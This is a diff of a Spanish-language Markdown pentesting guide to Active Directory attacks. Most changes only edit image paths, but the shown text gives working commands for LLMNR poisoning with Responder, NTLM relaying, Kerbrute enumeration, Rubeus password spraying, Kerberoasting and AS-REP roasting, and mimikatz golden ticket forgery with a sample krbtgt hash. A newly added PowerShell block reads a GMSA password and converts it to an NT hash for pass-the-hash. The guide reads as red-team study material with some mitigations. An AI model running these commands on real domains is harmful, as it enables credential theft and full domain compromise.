@@ -65,7 +65,8 @@
     - [Kerberos Backdoors](#kerberos-backdoors)
       - [Skeleton Key Overview](#skeleton-key-overview)
       - [Ejecución](#ejecución-7)
-    - [](#)
+    - [Abusando de ACLs/ACEs](#abusando-de-aclsaces)
+      - [ReadGMSAPassword](#readgmsapassword)
 - [Referencias](#referencias)
 
 ## LLMNR Poisoning
@@ -77,25 +78,25 @@
 - Anteriormente conocido como NBT-NS.
 - La falla principal es que los servicios ocupan un nombre de usuario del sistema operativo y un hash NTLMv2 a los cuales responden.
 
-![Información general](./images/llmnr.png)
+![Información general](images/llmnr.png)
 
 ### Ejecución
 
 1. Ejecutar responder (herramienta de impacket) `responder -I tun0 -rdw -v`.
 
-![Responder](./images/llmnr-responder.png)
+![Responder](images/llmnr-responder.png)
 
 2. Evento ocurre
 
-![Evento](./images/llmnr-event.png)
+![Evento](images/llmnr-event.png)
 
 3. Obtener hashes
 
-![Hashes](./images/llmnr-hashes.png)
+![Hashes](images/llmnr-hashes.png)
 
 4. Crackeo de hashes `hashcat -m 5600 hashes.txt rockyou.txt`
 
-![Crackeo](./images/llmnr-crack.png)
+![Crackeo](images/llmnr-crack.png)
 
 ### Defensas
 
@@ -124,21 +125,21 @@ En vez de buscar crackear los hashes obtenidos con responder, en su lugar se pue
 
 1. Modificar `responder.conf`
 
-![responder.conf](./images/responder-conf.png)
+![responder.conf](images/responder-conf.png)
 
 2. Ejecutar responder `responder.py -I tun0 -rdw -v`.
 
 3. Configurar relay a utilizar `impacket-ntlmrelayx -tf targets.txt -smb2support`.
 
-![Impacket ntlmrelay](./images/ntlmrelay.png)
+![Impacket ntlmrelay](images/ntlmrelay.png)
 
 4. Evento ocurre
 
-![Evento](./images/llmnr-event.png)
+![Evento](images/llmnr-event.png)
 
 5. Win (Pass the hash o Cracking)
 
-![Win](./images/relay-win.png)
+![Win](images/relay-win.png)
 
 ### Estrategias de mitigación
 
@@ -169,13 +170,13 @@ Es importante señalar que en el ambiente debe estar habilitado `LDAPS`, en la m
 2. Ejecutar ntlmrelayx indicando ip de domain controller, WPAD y loot (en caso de querelo) `impacket-ntlmrelayx -6 -t ldaps://192.168.111.149 -wh fakewpad.dsouls.local -l lootme`.
 3. A la hora de efectuarse, la información recopilada se almacenara en la carpeta indicada para loot.
 
-![Loot obtenido](./images/ipv6-loot.png)
+![Loot obtenido](images/ipv6-loot.png)
 
-![Información recopilada](./images/ipv6-loot-firefox.png)
+![Información recopilada](images/ipv6-loot-firefox.png)
 
 4. Si llegará autenticarse un administrador de dominio se ejecutará un alta de usuario nuevo con contraseña indicada en el log de `ntlmrlayx`.
 
-![Alta de usuario](./images/ipv6-user.png)
+![Alta de usuario](images/ipv6-user.png)
 
 ### Estrategias de mitigación
 
@@ -206,23 +207,44 @@ Es importante señalar que en el ambiente debe estar habilitado `LDAPS`, en la m
 
 Tabla de comandos relevantes, verificar documentación y/o [cheatsheet anexada](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993).
 
-| Comando | Descripción | Ejemplo de uso/respuesta |
-|---|---|---|
-| `Get-NetDomain` | Obtiene información del dominio | ![Net Domain](images/powerview-net-1.png)  |
-| `Get-NetDomainController` | Identifica y obtiene información de los controladores de dominio | ![Net Domain](images/powerview-net-2.png) |
-| `Get-DomainPolicy` | Obtiene las políticas del dominio | ![Net Domain](images/powerview-policy.png) |
-| `Get-NetUser` | Obtiene información acerca de los usuarios (considerar la propiedad `logoncount` podría existir la posibilidad que se encuentren usuarios HoneyPot) | ![Net Domain](images/powerview-user.png) |
-| `Get-NetComputer` | Obtiene toda la información de las computadoras enroladas en el dominio | ![Net Domain](images/powerview-computer.png) |
-| `Invoke-ShareFinder` | Realiza un búsqueda de las carpetas compartidas por medio de smb | ![Net Domain](images/powerview-share.png) |
-| `Get-NetGPO` | Obtiene infomación de todas las Group Policies | ![Net Domain](images/powerview-gpo.png) |
+- `Get-NetDomain`: Obtiene información del dominio.
+
+![Net Domain](images/powerview-net-1.png)
+
+- `Get-NetDomainController`: Identifica y obtiene información de los controladores de dominio.
+
+![Net Domain](images/powerview-net-2.png)
+
+- `Get-DomainPolicy`: Obtiene las políticas del dominio.
+
+![Net Domain](images/powerview-policy.png)
+
+- `Get-NetUser`: Obtiene información acerca de los usuarios (considerar la propiedad `logoncount` podría existir la posibilidad que se encuentren usuarios HoneyPot).
+
+![Net Domain](images/powerview-user.png)
+
+- `Get-NetComputer`: Obtiene toda la información de las computadoras enroladas en el dominio.
+
+![Net Domain](images/powerview-computer.png)
+
+- `Invoke-ShareFinder`: Realiza un búsqueda de las carpetas compartidas por medio de smb.
+
+![Net Domain](images/powerview-share.png)
+
+- `Get-NetGPO`: Obtiene infomación de todas las Group Policies.
+
+![Net Domain](images/powerview-gpo.png)
 
 #### BloodHound
 
 ##### Recopilación
 
+
 Recopilación de información con `SharpHound.ps1` disponible en el [repositorio oficial de BloodHound de recolectores](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors).
 
 `Invoke-BloodHound -CollectionMethod All -Domain DSOULS.local -ZipFileName file.zip`
+
+**Nota: Dentro de los recolectores disponibles específicamente de `SharpHound.ps1` y `SharpHound.exe` se han notado diferencias en como es graficada y recopilada la información, por lo que durante el recopilado de información se sugiere realizar dos recopilados, ejecutando `SharpHound.exe` sin ningún parámetro y `SharpHound.ps1` o `SharpHound.exe` específicando los métodos de recolección (`CollectionMethod`, etc.).**
 
 ##### Carga de información
 
@@ -261,7 +283,7 @@ Para encontrar posibles usuarios a usar para obtener acceso a la red, se puede h
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
 ```
 
-![Uso de Kerbrute](./images/kerbrute.png)
+![Uso de Kerbrute](images/kerbrute.png)
 
 #### Harvesting & Brute-Forcing Tickets
 
@@ -283,7 +305,7 @@ Rubeus.exe harvest /interval:30
 
 Rubeus recopilará TGTs cada 30 segundos.
 
-![Opción harvest de Rubeus](./images/rubeus-harvest.png)
+![Opción harvest de Rubeus](images/rubeus-harvest.png)
 
 ##### Brute-Forcing | Password-Spraying
 
@@ -295,7 +317,7 @@ Antes de ejecutar un spray de contraseñas se necesita añadir el nombre de domi
 
 Ejecutando `Rubeus.exe brute /password:Password1 /noticket` se usará la contraseña proveída y realizará un spray a todos los usuarios que se encuentren y con esto se obtendrá un TGT `.kirbi` para ese usuario.
 
-![Opción spray de Rubeus](./images/rubeus-spray.png)
+![Opción spray de Rubeus](images/rubeus-spray.png)
 
 Considerar la ejecución del ataque ya que puede ocasionar el bloqueo de cuentas, dependiendo de las políticas de las cuentas.
 
@@ -323,7 +345,7 @@ Rubeus.exe kerberoast
 
 Se permite el dumpeo de los usuarios aplicables.
 
-![Kerberoast con Rubeus](./images/kerberoasting-rubeus.png)
+![Kerberoast con Rubeus](images/kerberoasting-rubeus.png)
 
 ##### Ejecución - Impacket
 
@@ -370,7 +392,7 @@ Mientras se realiza la pre-autenticación, el hash de los usuarios será usado p
 
 Haciendo uso de `Rubeus.exe asreproast` permite buscar usuarios vulnerables para extraer el hash del usuario vulnerable encontrado.
 
-![AS-REP Roast con Rubeus](./images/asrep-rubeus.png)
+![AS-REP Roast con Rubeus](images/asrep-rubeus.png)
 
 ##### Ejecución - Impacket
 
@@ -419,7 +441,7 @@ El ataque permite escalar a domain admin si se extrae un ticket del mismo para i
 
 Con `sekurlsa::tickets /export` se exportará los tickets .kirbi al directorio donde actualmente se encuentre.
 
-![Exportación de TGT](./images/passticket-1.png)
+![Exportación de TGT](images/passticket-1.png)
 
 Después de identificar un ticket que se pueda utilizar se usa `kerberos::ptt <ticket>` siendo el ticket el archivo que se exportó previamente y con `klist` fuera de mimikatz se nos permite validar que el usuario se haya cargado correctamente.
 
@@ -570,13 +592,13 @@ En el ataque se extrae un TGT para cualquier usuario de dominio que preferenteme
 
 Para realizar el procedimiento es necesario obtener el identificador el dominio y el hash NTLM de la cuenta de krbtgt, obteniéndolo mediante `lsadump::lsa /inject /name:krbtgt` en mimikatz. En el caso de se opte por un silver ticket se necesitaría cambiar el parámetro `/name:<cuenta>` para extraer el hash de una cuenta domain admin o una cuenta de servicio.
 
-![SID y Hash NTLM de krbtgt](./images/golden-sid.png)
+![SID y Hash NTLM de krbtgt](images/golden-sid.png)
 
 Ejecutar `kerberos::golden /User:<nombre de usuario> /domain:<dominio> /sid:<sid extraido> /krbtgt:<hash NTLM> /id:<rid> /ptt` (Usando `/ptt` para inyectarlo en la sesión actual o sin la bandera para extraerlo a un archivo). Ejemplo `kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt`.
 
 Para crear un silver ticket se sustituiría el hash NTLM del servicio en `/krbtgt:<hash>` el SID del servicio en `/sid:<sid>` y cambiar el id por `/id:1103`.
 
-![Golden ticket generado](./images/golden-ticket.png)
+![Golden ticket generado](images/golden-ticket.png)
 
 TODO: Verificar la inyección del ticket desde fuera.
 
@@ -584,7 +606,7 @@ Levantar una sesión cmd con el ticket creado: `misc::cmd`.
 Visualizar contenido de un cliente perteneciente al dominio: `dir \\SITH\c$`
 Obtener una shell interactiva en cliente remoto con [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite): `psexec.exe \\SITH cmd.exe`
 
-![Sesión con ticket creado y ejecución de psexec](./images/psexec-exe.png)
+![Sesión con ticket creado y ejecución de psexec](images/psexec-exe.png)
 
 #### Kerberos Backdoors
 
@@ -605,7 +627,26 @@ De acuerdo a lo antes mencionado, el timestamp es cifrado con el hash NT de los 
 TODO: evidencia
 
 
-####
+#### Abusando de ACLs/ACEs
+
+##### ReadGMSAPassword
+
+Un atacante puede leer la contraseña GMSA para la cuenta que es aplicada la ACE.
+
+```powershell
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+# Build a NT-Hash for PTH
+(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
+# Alterantive: build a Credential-Object with the Plain Password
+$cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+# Visualizar la contraseña en texto claro
+ConvertTo-SecureString $passwd -AsPlainText -Force
+```
 
 ## Referencias
 
@@ -623,3 +664,4 @@ TODO: evidencia
 - [Kerberos Authentication Explained](https://www.varonis.com/blog/kerberos-authentication-explained)
 - [Abusing Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
 - [Kerberos & Attacks 101](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
+- [ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
